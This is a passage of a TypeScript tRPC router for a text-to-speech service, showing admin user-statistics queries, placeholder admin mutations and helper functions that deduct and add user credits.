            .where(
              sql`user_id = ${input.userId} AND created_at > DATE_SUB(NOW(), INTERVAL 30 DAY)`
            );

          // 7-day stats
          const [stats7] = await db
            .select({ count: count() })
            .from(ttsConversions)
            .where(
              sql`user_id = ${input.userId} AND created_at > DATE_SUB(NOW(), INTERVAL 7 DAY)`
            );

          // Success/Fail breakdown
          const statusRows = await db
            .select({
              status: sql`COALESCE(status, 'success')`,
              count: count(),
            })
            .from(ttsConversions)
            .where(
              sql`user_id = ${input.userId} AND created_at > DATE_SUB(NOW(), INTERVAL 30 DAY)`
            )
            .groupBy(sql`COALESCE(status, 'success')`);

          const statusBreakdown: any = { success: 0, fail: 0 };
          statusRows.forEach((r: any) => {
            if (r.status === "fail") statusBreakdown.fail = r.count;
            else statusBreakdown.success = r.count;
          });

          // Feature breakdown
          const featureRows = await db
            .select({ feature: sql`COALESCE(feature, 'tts')`, count: count() })
            .from(ttsConversions)
            .where(
              sql`user_id = ${input.userId} AND created_at > DATE_SUB(NOW(), INTERVAL 30 DAY)`
            )
            .groupBy(sql`COALESCE(feature, 'tts')`);
          const features = featureRows.map((r: any) => ({
            feature: r.feature,
            count: r.count,
          }));

          // Voice/character breakdown
          const voiceRows = await db
            .select({
              name: sql`COALESCE(character, voice, 'unknown')`,
              count: count(),
            })
            .from(ttsConversions)
            .where(
              sql`user_id = ${input.userId} AND created_at > DATE_SUB(NOW(), INTERVAL 30 DAY)`
            )
            .groupBy(sql`COALESCE(character, voice, 'unknown')`);
          const voices = voiceRows.map((r: any) => ({
            name: String(r.name),
            count: r.count,
          }));

          // Active hours
          const hourRows = await db
            .select({ hour: sql`HOUR(created_at)`, count: count() })
            .from(ttsConversions)
            .where(
              sql`user_id = ${input.userId} AND created_at > DATE_SUB(NOW(), INTERVAL 30 DAY)`
            )
            .groupBy(sql`HOUR(created_at)`);
          const activeHours = hourRows.map((r: any) => ({
            hour: Number(r.hour),
            count: r.count,
          }));

          // Daily breakdown
          const dailyRows = await db
            .select({ date: sql`DATE(created_at)`, count: count() })
            .from(ttsConversions)
            .where(
              sql`user_id = ${input.userId} AND created_at > DATE_SUB(NOW(), INTERVAL 30 DAY)`
            )
            .groupBy(sql`DATE(created_at)`)
            .orderBy(sql`DATE(created_at)`);
          const daily = dailyRows.map((r: any) => ({
            date: String(r.date),
            count: r.count,
          }));

          // Recent logs
          const recentLogs = await db
            .select()
            .from(ttsConversions)
            .where(eq(ttsConversions.userId, input.userId))
            .orderBy(desc(ttsConversions.createdAt))
            .limit(20);

          // Subscription
          const [sub] = await db
            .select()
            .from(subscriptions)
            .where(sql`user_id = ${input.userId} AND expires_at > NOW()`)
            .limit(1);

          return {
            totalGens: stats30?.count || 0,
            recentGens: stats7?.count || 0,
            totalChars: Number(stats30?.chars) || 0,
            totalDurationMs: Number(stats30?.duration) || 0,
            statusBreakdown,
            features,
            voices,
            activeHours,
            daily,
            recentLogs: recentLogs.map((l: any) => ({
              id: l.id,
              feature: l.feature,
              voice: l.voice,
              character: l.character,
              charCount: l.charCount,
              durationMs: l.durationMs,
              status: l.status || "success",
              errorMsg: l.errorMsg,
              createdAt: l.createdAt,
            })),
            subscription: sub || null,
          };
        } catch (e) {
          console.error("[getUserDetail Error]", e);
          return empty;
        }
      }),
    resolveError: adminProcedure
      .input(z.object({ errorId: z.string() }))
      .mutation(async () => {
        return { success: true };
      }),
    dismissFailedGen: adminProcedure
      .input(z.object({ id: z.string() }))
      .mutation(async () => {
        return { success: true };
      }),
    deleteSystemLog: adminProcedure
      .input(z.object({ id: z.string() }))
      .mutation(async () => {
        return { success: true };
      }),
  }),
});

export type AppRouter = typeof appRouter;

// Helper: Check and deduct credits
async function deductCredits(
  userId: string,
  amount: number,
  type: string,
  description: string
): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;

  try {
    await db.transaction(async tx => {
      const [user] = await tx
        .select()
        .from(users)
        .where(eq(users.id, userId))
        .limit(1);
      if (!user) {
        throw new TRPCError({ code: "NOT_FOUND", message: "User not found" });
      }

      const currentCredits = user.credits ?? 0;
      if (currentCredits < amount) {
        throw new TRPCError({
          code: "BAD_REQUEST",
          message: `Insufficient credits. Need ${amount}, have ${currentCredits}`,
        });
      }

      await tx
        .update(users)
        .set({ credits: currentCredits - amount })
        .where(eq(users.id, userId));

      await tx.insert(creditTransactions).values({
        id: randomUUID(),
        userId,
        amount: -amount,
        type,
        description,
      });
    });

    return true;
  } catch (e: any) {
    if (e.code === "BAD_REQUEST" || e.code === "NOT_FOUND") throw e;
    console.error("[Credit Error]", e);
    return false;
  }
}

// Helper: Add credits
async function addCredits(
  userId: string,
  amount: number,
  type: string,
  description: string
): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;

  try {
    const [user] = await db
      .select()
      .from(users)
      .where(eq(users.id, userId))
      .limit(1);
    if (!user) return false;

    const currentCredits = user.credits ?? 0;
    await db
      .update(users)
      .set({ credits: currentCredits + amount })
      .where(eq(users.id, userId));

    await db.insert(creditTransactions).values({
      id: randomUUID(),
      userId,
      amount,
      type,
      description,
    });

    return true;
  } catch (e: any) {
    console.error("[Credit Add Error]", e);
    return false;
  }
}
